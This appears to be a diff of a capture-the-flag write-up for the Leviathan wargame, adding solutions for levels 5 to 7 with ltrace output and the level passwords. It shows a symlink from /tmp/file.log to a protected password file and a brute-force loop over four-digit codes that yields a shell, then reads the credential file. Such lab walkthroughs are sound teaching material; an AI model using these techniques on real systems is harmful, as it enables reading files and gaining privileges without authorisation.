@@ -181,7 +181,7 @@ puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
 )                                        = 19
 +++ exited (status 0) +++
 ```
-We can see the function `strcmp` that compares strings, and it compares out input with ``snlprintf'`.
+We can see the function `strcmp` that compares strings, and it compares out input with `'snlprintf'`.
 
 ```bash
 ./level3
@@ -219,7 +219,65 @@ First, we make a temp directory and copy `bin` output into a file called `binary
 * `$((2#$char))` - This part converts the char from binary to decimal (base 2 → base 10)
 * `'%x'` - This part converts the decimal value to hex (base 10 → base 16)
 * `\\x$(printf <previous bullets>)` - This part prints the hex value as a string, and adds `'\x'` in the beggining.
-* Lastly, `printf` talkes the string we created that looks like this `'\x<hex value>'` and prints it as `ASCII`
+* Lastly, `printf` talkes the string we created that looks like this `'\x<hex value>'` and prints it as `ASCII`.
+
 We do that for every char, and get the next password.
 
 Password: `0dyxT7F4QD`
+
+## Level 5 → 6
+```bash
+ls -la
+./leviathan5
+ltrace ./leviathan5
+```
+As we log in, there is a file `leviathan5`. When executed, it outputs an error: `cat: /tmp/file.log: No such file or directory`. It means that this executable tries to print the file `/tmp/file.log`, but it doesn't exists. We trace the running of `leviathan5` and get:
+```bash
+__libc_start_main(0x804910d, 1, 0xffffd494, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                       = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                 = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+```
+We can see that `fopen` is called, so the program is trying to open this file, and the flag `"r"` means it is trying to read from that file. We understand that the `leviathan5` is trying to open a file called `file.log` in `/tmp`, read it, and then print it with `cat`.
+
+```bash
+ln -s /etc/leviathan\_pass/leviathan6 /tmp/file.log
+./leviathan5
+```
+As we seen in level 2, we can create a `soft link` between files. So, we create the `/tmp/file.log`, and it is a soft link to the next level password. When `leviathan5` is executed, it uses `fopen` and `cat` on `file.log`, but because it is a soft link of the password file, the password is printed.
+
+Password: `szo7HDB88w`
+
+## Level 6 → 7
+```bash
+ls -la
+./leviathan6
+./leviathan6 0000
+```
+This time, there is a file called `leviathan6`, and when executed it prints:
+```bash
+usage: ./leviathan6 <4 digit code>
+```
+The program expects a 4 digit code. We try it with the code `0000` and it outputs `Wrong`. We can try to use the `Brute Force` approach in order to find the code, since it is only 4 digits.
+
+```bash
+for i in {0000..9999}; do
+> ./leviathan6 $i
+> done
+```
+After many attempts, we get access to a shell.
+
+```bash
+$ whoami
+leviathan7
+$ cat /etc/leviathan\_pass/leviathan7
+qEs5Io5yM8
+```
+We got access to the shell as `Leviathan7`, so we print the password.
+
+Password: `qEs5Io5yM8`
+
+## Level 7
+This is the last level. As we log in, there is a file that tells us 'Well done'.
